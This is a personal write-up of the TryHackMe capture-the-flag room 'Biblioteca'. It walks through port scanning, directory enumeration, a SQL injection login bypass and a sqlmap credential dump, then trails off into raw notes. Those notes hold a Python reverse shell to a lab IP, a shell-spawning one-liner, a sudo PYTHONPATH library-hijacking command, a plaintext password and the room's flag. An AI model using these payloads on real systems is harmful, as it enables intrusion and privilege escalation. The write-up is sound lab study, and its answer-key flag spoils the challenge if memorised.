# TryHackMe Biblioteca Writeup

This is my write up for the TryHackMe room [Biblioteca](https://tryhackme.com/room/biblioteca).


We start up the machine and we can start with a nmap scan.

`nmap -sC -sV <IP Address>`

![NmapScanBiblio](/THM/Images/thmbiblionmap.jpg)

This provides us with two open ports.

- SSH port 22
- HTTP port 8000

We a login page on the landing. First thing to do is to find there any other folders or pages we can access. For that we can enumerate using `gobuster`

![BiblioTHMLandin](/THM/Images/thmbibliohttplanding.jpg)

This are the results from `gobuster` enumeration. The command used was.

`gobuster dir -u http://<IP ADDRESS> -w /usr/share/wordlists/dirb/common.txt`

![BiblioGobuster](/THM/Images/thmbibliogobuster.jpg)

We can create an user it just takes to an index page with only an option to logout.

If we try `1' or '1'='1';-- -` , we can see that the login form is vulnerable to SQL injection.

We can then use `sqlmap` to extract table data.

`sqlmap -u http://<IP ADDRESS>:8000/login --data='username=''&password=''' --current-user --dump`

Breaking down the command 

```bash 
-u http://<IP ADDRESS>:8000/login  # the flag refers to the target URL
--data= 'username=''&password=''' # Data string to be sent through POST (e.g. "id=1")
--current-user --dump # --current-user Retrieve DBMS current user --dump DUMP DMBS Database table entries.
```

This provides ust the following table.

![BiblioSQLMAPresults](/THM/Images/thmbibliosqlmap.jpg)

The top result gives us user 1 password, the other result is from the user we created.

We can now try the password found with the username to SSH into the machine. 

Excellent we are in. We can see that the user `smokey` has really limited surface points to privilege escalation. Let's see what other users have 


@reboot /usr/bin/python3 /var/opt/app/app.py
sqlmap -u http://10.10.218.78:8000/login --data='username=''&password=''' -D --dump --level=1

My_P@ssW0rd123

import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.4.56.213",9000))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1) 
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])


python3 -c 'import os; os.system("/bin/sh")'

hazel has a weak password. can be broken with hydra or guessed. hazel


 sudo PYTHONPATH=/tmp/ /usr/bin/python3 /home/hazel/hasher.py


python library hijacking

THM{PytH0n_LiBr@RY_H1j@acKIn6}